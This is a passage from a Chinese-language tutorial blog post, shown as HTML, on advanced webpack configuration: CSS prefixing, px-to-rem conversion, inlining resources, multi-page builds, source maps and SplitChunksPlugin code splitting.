class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<!-- webpack.prod.js -->\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plugins: [<span class=\"keyword\">new</span> CleanWebpackPlugin()];</span><br></pre></td></tr></table></figure>\n<h2 id=\"自动补齐-CSS3-前缀\"><a href=\"#自动补齐-CSS3-前缀\" class=\"headerlink\" title=\"自动补齐 CSS3 前缀\"></a>自动补齐 CSS3 前缀</h2><p>由于各种浏览器对于 CSS3 新特性支持程度的不同，导致实际使用中需要针对不同内核浏览器给出前缀，示例如下：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">-moz-border-radius</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">-webkit-border-radius</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">-o-border-radius</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">border-radius</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>实际生产中我们当然不想这么低效率，因此可以使用构建工具来自动完成这些。在 webpack 中可以使用 PostCSS 插件 autoprefixer 来实现。至于哪些属性需要加前缀，主要是根据配置的 browserslist 和<a href=\"https://caniuse.com/\" target=\"_blank\" rel=\"noopener\">Can I Use</a>规则确定。具体使用，首先安装 npm 包<code>postcss-loader</code>和<code>autoprefixer</code>，然后配置具体参数，最后示例如下：</p>\n<!-- webpack.prod.js -->\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    test: <span class=\"regexp\">/.css$/</span>,</span><br><span class=\"line\">    use: [</span><br><span class=\"line\">        <span class=\"string\">'css-loader'</span>,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            loader: <span class=\"string\">'postcss-loader'</span>,</span><br><span class=\"line\">            options: &#123;</span><br><span class=\"line\">                plugins: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> [</span><br><span class=\"line\">                    <span class=\"built_in\">require</span>(<span class=\"string\">'autoprefixer'</span>)()</span><br><span class=\"line\">                ]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n<!-- package.json -->\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"browserslist\": [</span><br><span class=\"line\">  \"last 2 version\",</span><br><span class=\"line\">  \"&gt; 1%\",</span><br><span class=\"line\">  <span class=\"string\">\"iOS 7\"</span></span><br><span class=\"line\">],</span><br></pre></td></tr></table></figure>\n<h2 id=\"移动端-CSS-中的-px-自动转成-rem\"><a href=\"#移动端-CSS-中的-px-自动转成-rem\" class=\"headerlink\" title=\"移动端 CSS 中的 px 自动转成 rem\"></a>移动端 CSS 中的 px 自动转成 rem</h2><p><img src=\"/webpack-advance-1/px2rem.jpg\" alt=\"终端分辨率对比图\"><br>为什么要转换，因为各终端分辨率不同，px 是绝对单位，想要响应式布局，就得针对不同分辨率作相应的调整。思路一是用媒体查询：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">980px</span>) &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">900px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">480px</span>) &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">400px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">350px</span>) &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.header</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>思路二是用相对单位 rem，rem 是相对于页面根元素 html 的大小来确定其他元素的大小。使用 rem，条件一是动态设置 html 的 font-size，条件二是根据视觉稿编写具体元素的对应 px 的 rem 值。计算根元素的 font-size 值可以使用手淘的<a href=\"https://github.com/amfe/lib-flexible\" target=\"_blank\" rel=\"noopener\">lib-flexible</a>库，px 转成 rem 可以利用样式预编译库的类函数功能去实现，也可以利用构建工具去处理。推荐<code>lib-flexible</code>+<code>px2rem-loader</code>，示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"comment\">// lib-flexible库代码</span></span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    test: <span class=\"regexp\">/.css$/</span>,</span><br><span class=\"line\">    use: [</span><br><span class=\"line\">        <span class=\"string\">'css-loader'</span>,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            loader: <span class=\"string\">'px2rem-loader'</span>,</span><br><span class=\"line\">            options: &#123;</span><br><span class=\"line\">                remUnit: <span class=\"number\">75</span>,</span><br><span class=\"line\">                remPrecision: <span class=\"number\">8</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"静态资源内联\"><a href=\"#静态资源内联\" class=\"headerlink\" title=\"静态资源内联\"></a>静态资源内联</h2><p>资源内联意义有：页面框架的初始化脚本、上报相关打点、css 内联避免页面闪动和减少 http 网络请求数。</p>\n<h3 id=\"HTML-和-JS-内联\"><a href=\"#HTML-和-JS-内联\" class=\"headerlink\" title=\"HTML 和 JS 内联\"></a>HTML 和 JS 内联</h3><p>可以用 webpack 的 raw-loader 实现，示例如下（<a href=\"mailto:raw-loader@0.5.1\" target=\"_blank\" rel=\"noopener\">raw-loader@0.5.1</a>）：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    $&#123;require('raw-loader!./meta.html')&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">      $&#123;<span class=\"built_in\">require</span>(<span class=\"string\">'raw-loader!babel-loader!../../node_modules/lib-flexible/flexible.js'</span>)&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"root\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"CSS-内联\"><a href=\"#CSS-内联\" class=\"headerlink\" title=\"CSS 内联\"></a>CSS 内联</h3><p>用 webpack 的 style-loader</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>: &#123;</span><br><span class=\"line\">  rules: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      test: <span class=\"regexp\">/\\.scss$/</span>,</span><br><span class=\"line\">      use: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          loader: <span class=\"string\">\"style-loader\"</span>,</span><br><span class=\"line\">          options: &#123;</span><br><span class=\"line\">            insertAt: <span class=\"string\">\"top\"</span>, <span class=\"comment\">// 样式插入到&lt;head&gt;</span></span><br><span class=\"line\">            singleton: <span class=\"literal\">true</span> <span class=\"comment\">//将所有的style标签合并成一个</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"string\">\"css-loader\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"sass-loader\"</span></span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"小图片或者字体内联\"><a href=\"#小图片或者字体内联\" class=\"headerlink\" title=\"小图片或者字体内联\"></a>小图片或者字体内联</h3><p>用 webpack 的 url-loader</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>: &#123;</span><br><span class=\"line\">  rules: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      test: <span class=\"regexp\">/.(png|jpg|gif|jpeg)$/</span>,</span><br><span class=\"line\">      use: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          loader: <span class=\"string\">\"url-loader\"</span>,</span><br><span class=\"line\">          options: &#123;</span><br><span class=\"line\">            limit: <span class=\"number\">10240</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      test: <span class=\"regexp\">/.(woff|woff2|eot|ttf|otf)$/</span>,</span><br><span class=\"line\">      use: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          loader: <span class=\"string\">\"url-loader\"</span>,</span><br><span class=\"line\">          options: &#123;</span><br><span class=\"line\">            limit: <span class=\"number\">10240</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"多页面应用打包通用方案\"><a href=\"#多页面应用打包通用方案\" class=\"headerlink\" title=\"多页面应用打包通用方案\"></a>多页面应用打包通用方案</h2><p>思路一，每个页面对应一个 entry，一个 html-webpack-plugin，缺点就是增删页面需要修改 webpack 配置文件。<br>思路二，动态获取 entry 和设置 html-webpack-plugin 数量，前提是约定各个页面文件结构，例如每个页面一个单独文件夹，每个入口文件名都为 index.js。示例如下：</p>\n<!-- webpack.config.js -->\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> glob = <span class=\"built_in\">require</span>(<span class=\"string\">\"glob\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">\"path\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> HtmlWebpackPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">\"html-webpack-plugin\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; CleanWebpackPlugin &#125; = <span class=\"built_in\">require</span>(<span class=\"string\">\"clean-webpack-plugin\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> setMPA = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> entry = &#123;&#125;;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> htmlWebpackPlugins = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> entryFiles = glob.sync(path.join(__dirname, <span class=\"string\">\"./src/*/index.js\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">Object</span>.keys(entryFiles).map(<span class=\"function\"><span class=\"params\">index</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> entryFile = entryFiles[index];</span><br><span class=\"line\">    <span class=\"keyword\">const</span> match = entryFile.match(<span class=\"regexp\">/src\\/(.*)\\/index\\.js/</span>);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> fileName = match &amp;&amp; match[<span class=\"number\">1</span>];</span><br><span class=\"line\">    entry[fileName] = entryFile;</span><br><span class=\"line\"></span><br><span class=\"line\">    htmlWebpackPlugins.push(</span><br><span class=\"line\">      <span class=\"keyword\">new</span> HtmlWebpackPlugin(&#123;</span><br><span class=\"line\">        template: path.join(__dirname, <span class=\"string\">`src/<span class=\"subst\">$&#123;fileName&#125;</span>/index.html`</span>),</span><br><span class=\"line\">        filename: <span class=\"string\">`<span class=\"subst\">$&#123;fileName&#125;</span>.html`</span>,</span><br><span class=\"line\">        chunks: [<span class=\"string\">\"vendors\"</span>, fileName],</span><br><span class=\"line\">        inject: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        minify: &#123;</span><br><span class=\"line\">          html5: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          collapseWhitespace: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          preserveLineBreaks: <span class=\"literal\">false</span>,</span><br><span class=\"line\">          minifyCSS: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          minifyJS: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          removeComments: <span class=\"literal\">false</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    entry,</span><br><span class=\"line\">    htmlWebpackPlugins</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; entry, htmlWebpackPlugins &#125; = setMPA();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  entry: entry,</span><br><span class=\"line\">  output: &#123;</span><br><span class=\"line\">    path: path.join(__dirname, <span class=\"string\">\"dist\"</span>),</span><br><span class=\"line\">    filename: <span class=\"string\">\"[name]_[chunkhash:8].js\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  plugins: [<span class=\"keyword\">new</span> CleanWebpackPlugin()].concat(htmlWebpackPlugins)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这个示例中使用了 npm 包<code>glob</code>来读文件，当然也可以直接用 node 的 fs 模块实现，或者其他功能包。</p>\n<h2 id=\"使用-source-map\"><a href=\"#使用-source-map\" class=\"headerlink\" title=\"使用 source map\"></a>使用 source map</h2><p>作用是通过 source map 定位到源代码，主要用于调试，所以开发环境开启，线上环境关闭。source map 类型很多，重点是掌握几个关键字的含义，然后各种类型含义也只是关键字的组合。关键字含义如下：</p>\n<ul>\n<li>source map: 产生.map 文件</li>\n<li>eval: 使用 eval 包裹模块代码</li>\n<li>cheap: 不包含列列信息</li>\n<li>inline: 将.map 作为 DataURI 嵌入，不不单独生成.map 文件</li>\n<li>module:包含 loader 的 sourcemap</li>\n</ul>\n<h2 id=\"提取页面公共资源\"><a href=\"#提取页面公共资源\" class=\"headerlink\" title=\"提取页面公共资源\"></a>提取页面公共资源</h2><h3 id=\"基础库分离\"><a href=\"#基础库分离\" class=\"headerlink\" title=\"基础库分离\"></a>基础库分离</h3><p>将 react、react-dom 基础包通过 cdn 引入，不打入 bundle 中，可以使用<code>html-webpackexternals-plugin</code>实现：</p>\n<!-- webpack.config.js -->\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> HtmlWebpackExternalsPlugin = <span class=\"built_in\">require</span>(<span class=\"string\">\"html-webpack-externals-plugin\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  plugins: [</span><br><span class=\"line\">    <span class=\"keyword\">new</span> HtmlWebpackExternalsPlugin(&#123;</span><br><span class=\"line\">      externals: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">module</span>: <span class=\"string\">\"react\"</span>,</span><br><span class=\"line\">          entry: <span class=\"string\">\"https://unpkg.com/react@16/umd/react.production.min.js\"</span>,</span><br><span class=\"line\">          global: <span class=\"string\">\"React\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">module</span>: <span class=\"string\">\"react-dom\"</span>,</span><br><span class=\"line\">          entry:</span><br><span class=\"line\">            <span class=\"string\">\"https://unpkg.com/react-dom@16/umd/react-dom.production.min.js\"</span>,</span><br><span class=\"line\">          global: <span class=\"string\">\"ReactDOM\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"root\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://unpkg.com/react@16/umd/react.production.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://unpkg.com/react-dom@16/umd/react-dom.production.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-SplitChunksPlugin-进行公共脚本分离\"><a href=\"#利用-SplitChunksPlugin-进行公共脚本分离\" class=\"headerlink\" title=\"利用 SplitChunksPlugin 进行公共脚本分离\"></a>利用 SplitChunksPlugin 进行公共脚本分离</h3><p>利用 SplitChunksPlugin 分离基础包</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  optimization: &#123;</span><br><span class=\"line\">    splitChunks: &#123;</span><br><span class=\"line\">      cacheGroups: &#123;</span><br><span class=\"line\">        commons: &#123;</span><br><span class=\"line\">          test: <span class=\"regexp\">/(react|react-dom)/</span>, <span class=\"comment\">//匹配出需要分离的包</span></span><br><span class=\"line\">          name: <span class=\"string\">\"vendors\"</span>,</span><br><span class=\"line\">          chunks: <span class=\"string\">\"all\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>利用 SplitChunksPlugin 分离页面公共文件</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  optimization: &#123;</span><br><span class=\"line\">    splitChunks: &#123;</span><br><span class=\"line\">      minSize: <span class=\"number\">0</span>, <span class=\"comment\">//分离的包体积的大小</span></span><br><span class=\"line\">      cacheGroups: &#123;</span><br><span class=\"line\">        commons: &#123;</span><br><span class=\"line\">          name: <span class=\"string\">\"commons\"</span>,</span><br><span class=\"line\">          chunks: <span class=\"string\">\"all\"</span>,</span><br><span class=\"line\">          minChunks: <span class=\"number\">2</span> <span class=\"comment\">//设置最小引用次数为2次</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span 